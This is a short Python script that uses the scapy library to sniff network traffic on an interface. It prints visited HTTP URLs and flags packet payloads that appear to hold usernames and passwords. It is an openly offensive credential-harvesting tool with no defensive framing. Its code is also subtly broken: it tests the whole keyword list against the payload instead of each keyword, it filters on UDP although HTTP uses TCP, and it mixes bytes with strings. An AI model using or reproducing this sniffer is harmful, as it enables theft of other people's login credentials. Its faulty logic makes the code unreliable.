#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] URL: " + url)
        logininfo = login_info(packet)
        if logininfo:
            print("[+] WARNING: Possible username and password " + logininfo)

def login_info(packet):
    if packet.haslayer(http.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "pass", "login", "password", "email"]
        if keywords in load:
            return load

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="udp")

sniff("eth0")

